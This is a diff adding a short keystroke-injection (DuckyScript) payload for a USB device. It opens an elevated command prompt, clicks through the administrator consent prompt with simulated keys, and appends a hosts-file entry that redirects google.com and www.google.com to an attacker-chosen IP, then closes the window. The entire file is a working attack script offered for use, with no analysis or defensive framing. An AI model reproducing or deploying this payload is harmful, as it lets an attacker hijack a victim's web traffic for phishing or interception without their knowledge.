@@ -1,0 +1,15 @@
+GUI r
+DELAY 400
+STRING cmd
+DELAY 700
+CTRL SHIFT ENTER
+DELAY 1500
+LEFTARROW
+DELAY 400
+ENTER
+DELAY 700
+STRING echo <YourIP> google.com www.google.com >> C:/Windows/System32/drivers/etc/hosts
+DELAY 400
+ENTER
+DELAY 400
+ALT F4
